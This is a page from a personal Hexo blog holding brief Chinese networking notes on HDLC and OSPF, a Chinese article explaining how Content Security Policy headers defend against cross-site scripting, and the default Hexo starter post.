<p><img src="https://img-blog.csdnimg.cn/20181119082510229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70" alt="img"></p>
<h3 id="HDLC协议"><a href="#HDLC协议" class="headerlink" title="HDLC协议"></a>HDLC协议</h3><p>HDLC(High-level Data Link Control)，高级数据链路控制，简称HDLC，是一种面向比特的链路层协议，思科私有协议，现在几乎不用</p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p><img src="https://pic4.zhimg.com/80/v2-991572825990575d273f653a78bcc5e7_720w.webp" alt="img"></p>
<p>当交换机表满的时候，如果再需要记录新的，就会顶掉已经记录的，而且当需要跨网络发送消息时，需要进行广播，效率很低，这时候设计了一个设备：路由器（又叫网关），实现不同网络之间的通信，引入了一个新的标识：ip，ip主要实现两个功能：1.标识网络，2.标识设备，ip是一个抽象的标识符。</p>
<h3 id="ospf协议（最短路径协议）"><a href="#ospf协议（最短路径协议）" class="headerlink" title="ospf协议（最短路径协议）"></a>ospf协议（最短路径协议）</h3><h3 id="https-www-bilibili-com-video-BV1YV41127U5-spm-id-from-333-880-my-history-page-click-vd-source-fa2b36660445eda170cf45a8fdf97a97"><a href="#https-www-bilibili-com-video-BV1YV41127U5-spm-id-from-333-880-my-history-page-click-vd-source-fa2b36660445eda170cf45a8fdf97a97" class="headerlink" title="https://www.bilibili.com/video/BV1YV41127U5/?spm_id_from=333.880.my_history.page.click&amp;vd_source=fa2b36660445eda170cf45a8fdf97a97"></a><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1YV41127U5/?spm_id_from=333.880.my_history.page.click&vd_source=fa2b36660445eda170cf45a8fdf97a97">https://www.bilibili.com/video/BV1YV41127U5/?spm_id_from=333.880.my_history.page.click&amp;vd_source=fa2b36660445eda170cf45a8fdf97a97</a></h3><p>出现主要是弥补rip协议以跳数寻找最短路径方法缺陷，</p>
<p>在实际情况中，光凭跳数实际并不是最短路径，ospf改为消耗时间进行计算，</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/08/01/HTML5%E5%AE%89%E5%85%A8%EF%BC%9A%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-CSP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/08/01/HTML5%E5%AE%89%E5%85%A8%EF%BC%9A%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-CSP/" class="post-title-link" itemprop="url">HTML5安全：内容安全策略(CSP)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2023-08-01 20:20:33 / Modified: 20:30:25" itemprop="dateCreated datePublished" datetime="2023-08-01T20:20:33+08:00">2023-08-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>万维网的安全策略植根于<a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Same_origin_policy">同源策略</a>。例如<a target="_blank" rel="noopener" href="http://blog.csdn.net/hfahe%E7%9A%84%E4%BB%A3%E7%A0%81%E5%8F%AA%E8%83%BD%E8%AE%BF%E9%97%AE[http://blog.csdn.net](http://blog.csdn.net/)%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%80%8C%E6%B2%A1%E6%9C%89%E8%AE%BF%E9%97%AE[http://www.baidu.com](http://www.baidu.com/)%E7%9A%84%E6%9D%83%E9%99%90%E3%80%82%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E9%83%BD%E4%B8%8E%E7%BD%91%E7%BB%9C%E7%9A%84%E5%85%B6%E5%AE%83%E9%83%A8%E5%88%86%E5%88%86%E9%9A%94%E5%BC%80%EF%BC%8C%E4%B8%BA%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E6%9E%84%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%AE%89%E5%85%A8%E7%9A%84%E6%B2%99%E7%AE%B1%E3%80%82%E7%90%86%E8%AE%BA%E4%B8%8A%E8%BF%99%E6%98%AF%E5%AE%8C%E7%BE%8E%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E7%8E%B0%E5%9C%A8%E6%94%BB%E5%87%BB%E8%80%85%E5%B7%B2%E7%BB%8F%E6%89%BE%E5%88%B0%E4%BA%86%E8%81%AA%E6%98%8E%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9D%A5%E7%A0%B4%E5%9D%8F%E8%BF%99%E4%B8%AA%E7%B3%BB%E7%BB%9F%E3%80%82">http://blog.csdn.net/hfahe的代码只能访问[http://blog.csdn.net](http://blog.csdn.net/)的数据，而没有访问[http://www.baidu.com](http://www.baidu.com/)的权限。每个来源都与网络的其它部分分隔开，为开发人员构建了一个安全的沙箱。理论上这是完美的，但是现在攻击者已经找到了聪明的方式来破坏这个系统。</a></p>
<p>这就是<a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Cross-site_scripting">XSS跨站脚本攻击</a>，通过虚假内容和诱骗点击来绕过同源策略。这是一个很大的问题，如果攻击者成功注入代码，有相当多的用户数据会被泄漏。</p>
<p>现在我们介绍一个全新的、有效的安全防御策略来减轻这种风险，这就是<strong>内容安全策略</strong>（ContentSecurity Policy，CSP）。</p>
<p><strong>来源白名单</strong></p>
<p>XSS攻击的核心是利用了浏览器无法区分脚本是被第三方注入的，还是真的是你应用程序的一部分。例如Google +1按钮会从<a target="_blank" rel="noopener" href="https://apis.google.com/js/plusone.js%E5%8A%A0%E8%BD%BD%E5%B9%B6%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%EF%BC%8C[%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E4%B8%8D%E8%83%BD%E6%8C%87%E6%9C%9B%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%83%BD%E5%88%A4%E6%96%AD%E5%87%BA%E4%BB%A3%E7%A0%81%E6%98%AF%E7%9C%9F%E7%9A%84%E6%9D%A5%E8%87%AAapis.google.com](http://xn--apis-z94fra56k3e1c92cv1tnoa117bb4bp08ampvtxd4spjmcna060c2xbw68el6y7pxia892b00hk49eka074e5u4e.google.com/)%EF%BC%8C[%E8%BF%98%E6%98%AF%E6%9D%A5%E8%87%AAapis.evil.example.com](http://xn--apis-zi0i45d237f9jxa.evil.example.com/)%E3%80%82%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8B%E8%BD%BD%E5%B9%B6%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E9%A1%B5%E9%9D%A2%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%80%8C%E4%B8%8D%E8%AE%BA%E5%85%B6%E6%9D%A5%E6%BA%90%E3%80%82">https://apis.google.com/js/plusone.js加载并执行代码，[但是我们不能指望从浏览器上的图片就能判断出代码是真的来自apis.google.com](http://xn--apis-z94fra56k3e1c92cv1tnoa117bb4bp08ampvtxd4spjmcna060c2xbw68el6y7pxia892b00hk49eka074e5u4e.google.com/)，[还是来自apis.evil.example.com](http://xn--apis-zi0i45d237f9jxa.evil.example.com/)。浏览器下载并执行任意代码的页面请求，而不论其来源。</a></p>
<p><img src="https://box.kancloud.cn/2016-08-09_57a9a2e8157e9.jpg" alt="img"></p>
<p>CSP定义了Content-Security-PolicyHTTP头来允许你创建一个可信来源的白名单，使得浏览器只执行和渲染来自这些来源的资源，而不是盲目信任服务器提供的所有内容。即使攻击者可以找到漏洞来注入脚本，但是因为来源不包含在白名单里，因此将不会被执行。</p>
<p>以上面Google +1按钮为例，因为我们相信apis.google.com提供有效的代码，以及我们自己，所以可以定义一个策略，允许浏览器只会执行下面两个来源之一的脚本。</p>
<p>Content-Security-Policy:script-src ‘self’ <a target="_blank" rel="noopener" href="https://apis.google.com/">https://apis.google.com</a></p>
<p>是不是很简单？script-src可以为指定页面控制脚本相关权限。这样浏览器只会下载和执行来自<a target="_blank" rel="noopener" href="http://apis.google.com/">http://apis.google.com</a>和本页自身的脚本。</p>
<p>一旦我们定义了这个策略，浏览器会在检测到注入代码时抛出一个错误（请注意是什么浏览器）。</p>
<p><strong>内容安全策略适用于所有常用资源</strong></p>
<p>虽然脚本资源是最明显的安全隐患，但是CSP还提供了一套丰富的指令集，允许页面控制加载各种类型的资源，例如如下的类型：</p>
<ul>
<li>content-src：限制连接的类型（例如XHR、WebSockets和EventSource）</li>
<li>font-src：控制网络字体的来源。例如可以通过font-src <a target="_blank" rel="noopener" href="https://themes.googleusercontent.com/">https://themes.googleusercontent.com</a>来使用Google的网络字体。</li>
<li>frame-src：列出了可以嵌入的frame的来源。例如frame-src <a target="_blank" rel="noopener" href="https://youtube.com只允许嵌入youtube的视频/">https://youtube.com只允许嵌入YouTube的视频</a>。。</li>
<li>img-src：定义了可加载图像的来源。</li>
<li>media-src：限制视频和音频的来源。</li>
<li>object-src：限制Flash和其他插件的来源。</li>
<li>style-src：类似于Script-src，只是作用于css文件。</li>
</ul>
<p>默认情况下，所有的设置都是打开的，不做任何限制。你可以以分号分隔多个指令，但是类似于script-src <a target="_blank" rel="noopener" href="https://host1.com/">https://host1.com</a>;script-src<a target="_blank" rel="noopener" href="https://host2.com/">https://host2.com</a>的形式，第二个指令将会被忽略。正确的写法是script-src <a target="_blank" rel="noopener" href="https://host1.com/">https://host1.com</a><a target="_blank" rel="noopener" href="https://host2.com/">https://host2.com</a>。</p>
<p>例如，你有一个应用需要从内容分发网络（CDN，例如<a href="https://cdn.example.net）加载所有的资源，并且知道不需要任何frame和插件的内容，你的策略可能会像下面这样：">https://cdn.example.net）加载所有的资源，并且知道不需要任何frame和插件的内容，你的策略可能会像下面这样：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src https://cdn.example.net; frame-src &#x27;none&#x27;; object-src &#x27;none&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>细节</strong></p>
<p>我在例子里使用的HTTP头是Content-Security-Policy，但是现代浏览器已经通过前缀来提供了支持：Firefox使用x-Content-Security-Policy，WebKit使用X-WebKit-CSP。未来会逐步过渡到统一的标准。</p>
<p>策略可以根据每个不同的页面而设定，这提供了很大的灵活度。因为你的站点可能有的页面有Google +1的按钮，而有的则没有。</p>
<p>每个指令的来源列表可以相当灵活，你可以指定模式（data:, https:），或者指定主机名在一个范围（<a target="_blank" rel="noopener" href="http://example.com/">example.com</a>，它匹配主机上的任意来源、任意模式和任意端口），或者指定一个完整的URI（<a target="_blank" rel="noopener" href="https://example.com/">https://example.com:443</a>，特指https协议，example.com域名，443端口）。</p>
<p>你在来源列表中还可以使用四个关键字：</p>
<ul>
<li>“none”：你可能期望不匹配任何内容</li>
<li>“self”：与当前来源相同，但不包含子域</li>
<li>“unsafe-inline”：允许内联Javascript和CSS</li>
<li>“unsafe-eval”：允许文本到JS的机制例如eval</li>
</ul>
<p>请注意，这些关键词需要加引号。</p>
<p><strong>沙箱</strong></p>
<p>这里还有另外一个值得讨论的指令：sandbox。和其他指令有些不一致，它主要是控制页面上采取的行为，而不是页面能够加载的资源。如果设置了这个属性，页面就表现为一个设置了sandbox属性的frame一样。这对页面有很大范围的影响，例如防止表单提交等。这有点超出了本文的范围，但是你可以在<a target="_blank" rel="noopener" href="http://www.whatwg.org/specs/web-apps/current-work/multipage/origin-0.html#sandboxing-flag-set">HTML5规范的“沙箱标志设置”章节</a>找到更多信息。</p>
<p><strong>有害的内联代码</strong></p>
<p>CSP基于来源白名单，但是它不能解决XSS攻击的最大来源：内联脚本注入。如果攻击者可以注入包含有害代码的script标签（），浏览器并没有好的机制来区分这个标签。CSP只能通过完全禁止内联脚本来解决这个问题。</p>
<p>这个禁止项不仅包括脚本中嵌入的script标签，还包括内联事件处理程序和javascrpt:这种URL。你需要把script标签的内容放到一个外部文件里，并且用适当的addEventListener的方式替换javascript:和&lt;a… onclick&#x3D;”[JAVASCRIPT]”&gt;。例如，你可能会把下面的表单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  function doAmazingThings() &#123;</span><br><span class="line">    alert(&#x27;YOU AM AMAZING!&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;button onclick=&#x27;doAmazingThings();&#x27;&gt;Am I amazing?&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p>重写为下面的形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- amazing.html --&gt;</span><br><span class="line">&lt;script src=&#x27;amazing.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;button id=&#x27;amazing&#x27;&gt;Am I amazing?&lt;/button&gt;</span><br><span class="line">// amazing.js</span><br><span class="line">function doAmazingThings() &#123;</span><br><span class="line">  alert(&#x27;YOU AM AMAZING!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">document.addEventListener(&#x27;DOMContentReady&#x27;, function () &#123;</span><br><span class="line">  document.getElementById(&#x27;amazing&#x27;)</span><br><span class="line">          .addEventListener(&#x27;click&#x27;, doAmazingThings);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>无论是否使用CSP，以上的代码其实有更大的优点。内联JavaScript完全混合了结构和行为，你不应该这么做。另外外联资源更容易进行浏览器缓存，开发者更容易理解，并且便于编译和压缩。如果采用外联代码，你会写出更好的代码。</p>
<p>内联样式需要以同样的方式进行处理，无论是style属性还是style标签都需要提取到外部样式表中。这样可以防止各式各样<a target="_blank" rel="noopener" href="http://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html">神奇的数据泄漏方式</a>。</p>
<p>如果你必须要有内联脚本和样式，可以为script-src or style-src属性设定’unsafe-inline值。但是不要这样做，禁止内联脚本是CSP提供的最大安全保证，同时禁止内联样式可以让你的应用变得更加安全和健壮。这是一个权衡，但是非常值得。</p>
<p><strong>Eval</strong></p>
<p>即便攻击者不能直接注入脚本，他可能会诱使你的应用把插入的文本转换为可执行脚本并且自我执行。eval() , newFunction() , setTimeout([string], …) 和setInterval([string], …) 都可能成为这种危险的载体。CSP针对这种风险的策略是，完全阻止这些载体。</p>
<p>这对你构建应用的方式有一些影响：</p>
<p>通过内置的JSON.parse解析JSON，而不依靠eval。IE8以后的浏览器都支持本地JSON操作，这是完全安全的。</p>
<p>通过内联函数代替字符串来重写你setTimeout和setInterval的调用方式。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(&quot;document.querySelector(&#x27;a&#x27;).style.display = &#x27;none&#x27;;&quot;, 10); </span><br></pre></td></tr></table></figure>

<p>可以重写为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function () &#123; document.querySelector(&#x27;a&#x27;).style.display = &#x27;none&#x27;; &#125;, 10); </span><br></pre></td></tr></table></figure>

<p>避免运行时的内联模版：许多模版库都使用new Function()以加速模版的生成。这对动态程序来说非常棒，但是对恶意文本来说存在风险。</p>
<p><strong>报告</strong></p>
<p>CSP可以在服务器端阻止不可信的资源对用户来说非常有用，但是对于获取各种发送到服务器的通知来说对我们却非常有用，这样我们就能识别和修复任何恶意脚本注入。为此你可以通过report-uri指令指示浏览器发送JSON格式的拦截报告到某个地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>

<p>报告看起来会像下面这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;csp-report&quot;: &#123;</span><br><span class="line">    &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,</span><br><span class="line">    &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,</span><br><span class="line">    &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,</span><br><span class="line">    &quot;violated-directive&quot;: &quot;script-src &#x27;self&#x27; https://apis.google.com&quot;,</span><br><span class="line">    &quot;original-policy&quot;: &quot;script-src &#x27;self&#x27; https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中包含的信息会帮助你识别拦截的情况，包括拦截发生的页面（document-uri），页面的referrer，违反页面策略的资源（blocked-uri），所违反的指令（violated-directive）以及页面所有的内容安全策略（original-policy）。</p>
<p><strong>现实用法</strong></p>
<p>CSP现在在Chrome 16+和Firefox 4+的浏览器上可用，并且它在IE10上预计会获得有限的支持。Safari目前还不支持，但是WebKit每晚构建版已经可用，所以预计Safari将会在下面的迭代中提供支持。</p>
<p>下面让我们看一些常用的用例：</p>
<p><strong>实际案例1：社会化媒体widget</strong></p>
<ul>
<li>Google <a target="_blank" rel="noopener" href="http://www.google.com/intl/en/webmasters/+1/button/index.html">+1 button</a>包括来自<a target="_blank" rel="noopener" href="https://apis.google.com/">https://apis.google.com</a>的脚本，以及嵌入自<a target="_blank" rel="noopener" href="https://plusone.google.com的iframe.你的策略需要包含这些源来使用google/">https://plusone.google.com的iframe。你的策略需要包含这些源来使用Google</a> +1的按钮。最简单的策略是script-src <a target="_blank" rel="noopener" href="https://apis.google.com/">https://apis.google.com</a>; frame-src <a target="_blank" rel="noopener" href="https://plusone.google.com/">https://plusone.google.com</a>。你还需要确保Google提供的JS片段存放在外部的JS文件里。</li>
<li>Facebook的<a target="_blank" rel="noopener" href="http://developers.facebook.com/docs/reference/plugins/like/">Like按钮</a>有许多种实现方案。我建议你坚持使用iframe版本，因为它可以和你站点的其它部分保持很好的隔离。这需要使用frame-src <a target="_blank" rel="noopener" href="https://facebook.com/">https://facebook.com</a>指令。请注意，默认情况下，Facebook提供的iframe代码使用的是相对路径&#x2F;&#x2F;facebook.com，请把这段代码修改为<a target="_blank" rel="noopener" href="https://facebook.com/">https://facebook.com</a>，HTTP你没有必要可以不使用。</li>
<li>Twitter的<a target="_blank" rel="noopener" href="https://twitter.com/about/resources/buttons">Tweet按钮</a>依赖于script和frame，都来自于<a target="_blank" rel="noopener" href="https://platform.twitter.com(twitter/">https://platform.twitter.com（Twitter</a>默认提供的是相对URL，请在复制的时候编辑代码来指定为HTTPS方式）。</li>
</ul>
<p>其它的平台有相似的情况，可以类似的解决。我建议把default-src设置为none，然后查看控制台来检查你需要使用哪些资源来确保widget正常工作。</p>
<p>使用多个widget非常简单：只需要合并所有的策略指令，记住把同一指令的设置都放在一起。如果你想使用上面这三个widget，策略看起来会像下面这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src https://apis.google.com https://platform.twitter.com; frame-src https://plusone.google.com https://facebook.com https://platform.twitter.com</span><br></pre></td></tr></table></figure>

<p><strong>实际案例2：防御</strong></p>
<p>假设你访问一个银行网站，并且希望确保只加载你所需的资源。在这种情况下，开始设置一个默认的权限来阻止所有的内容（default-src ‘none’），并且从这从头构建策略。</p>
<p>比如，银行网站需要从来自<a target="_blank" rel="noopener" href="https://cdn.mybank.net/">https://cdn.mybank.net</a>的CDN加载图像、样式和脚本，并且通过XHR连接到<a target="_blank" rel="noopener" href="https://api.mybank.com/%E6%9D%A5%E6%8B%89%E5%8F%96%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%98%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8frame%EF%BC%8C%E4%BD%86%E6%98%AFframe%E9%83%BD%E6%9D%A5%E8%87%AA%E9%9D%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E7%9A%84%E6%9C%AC%E5%9C%B0%E9%A1%B5%E9%9D%A2%E3%80%82%E7%BD%91%E7%AB%99%E4%B8%8A%E6%B2%A1%E6%9C%89Flash%E3%80%81%E5%AD%97%E4%BD%93%E5%92%8C%E5%85%B6%E4%BB%96%E5%86%85%E5%AE%B9%E3%80%82%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%B8%8B%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%8F%91%E9%80%81%E6%9C%80%E4%B8%A5%E6%A0%BC%E7%9A%84CSP%E5%A4%B4%E6%98%AF%EF%BC%9A">https://api.mybank.com/来拉取各种数据，还需要使用frame，但是frame都来自非第三方的本地页面。网站上没有Flash、字体和其他内容。这种情况下我们可以发送最严格的CSP头是：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;none&#x27;; script-src https://cdn.mybank.net; style-src https://cdn.mybank.net; img-src https://cdn.mybank.net; connect-src https://api.mybank.com; frame-src &#x27;self&#x27; </span><br></pre></td></tr></table></figure>

<p><strong>实际案例3：只用SSL</strong></p>
<p>一个婚戒论坛管理员希望所有的资源都通过安全的方式进行加载，但是不想真的编写太多代码；重写大量第三方论坛内联脚本和样式的代码超出了他的能力。所以以下的策略将会是非常有用的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src https:; script-src https: &#x27;unsafe-inline&#x27;; style-src https: &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>

<p>尽管default-src指定了https，脚本和样式不会自动继承。每个指令将会完全覆盖默认资源类型。</p>
<p><strong>未来</strong></p>
<p>W3C的<a target="_blank" rel="noopener" href="http://www.w3.org/2011/webappsec/">Web应用安全工作组</a>正在制定内容安全策略规范的细节，1.0版本将要进入最后修订阶段，它和本文描述的内容已经非常接近。而public-webappsec@邮件组正在讨论1.1版本，浏览器厂商也在努力巩固和改进CSP的实现。</p>
<p>CSP 1.1在画板上有一些有趣的地方，值得单独列出来：</p>
<p><strong>通过meta标签添加策略</strong>：CSP的首选设置方式是HTTP头，它非常有用，但是通过标记或者脚本设置会更加直接，不过目前还未最终确定。WebKit已经实现了<a target="_blank" rel="noopener" href="https://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html#html-meta-element--experimenta">通过meta元素进行权限设置</a>的特性，所以你现在可以在Chrome下尝试如下的设置：在文档头添加&lt;metahttp-equiv&#x3D;”X-WebKit-CSP” content&#x3D;”[POLICY GOES HERE]”&gt;。</p>
<p>你甚至可以在运行时通过脚本来添加策略。</p>
<p><strong>DOM API：</strong>如果CSP的下一个迭代添加了这个特性，你可以通过Javascript来查询页面当前的安全策略，并根据不同的情况进行调整。例如在eval()是否可用的情况下，你的代码实现可能会有些许不同。这对JS框架的作者来说非常有用；并且API规范目前还非常不确定，你可以在<a target="_blank" rel="noopener" href="https://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html#script-interfaces">规范草案的脚本接口章节</a>找到最新的迭代版本。**</p>
<p><strong>新的指令</strong>：许多新指令正在讨论中，包括<a target="_blank" rel="noopener" href="https://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html#script-nonce--experimental">script-nonce</a>：只有明确指定的脚本元素才能使用内联脚本；<a target="_blank" rel="noopener" href="https://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html#plugin-types--experimental">plugin-types</a>：这将限制插件的类型；<a target="_blank" rel="noopener" href="https://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html#form-action--experimental">form-action</a>：允许form只能提交到特定的来源。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2023/07/30/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QWQ0QWQ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | QWQ0QWQ's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/07/30/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-07-30 17:48:42" itemprop="dateCreated datePublished" datetime="2023-07-30T17:48:42+08:00">2023-07-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">QWQ0QWQ</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
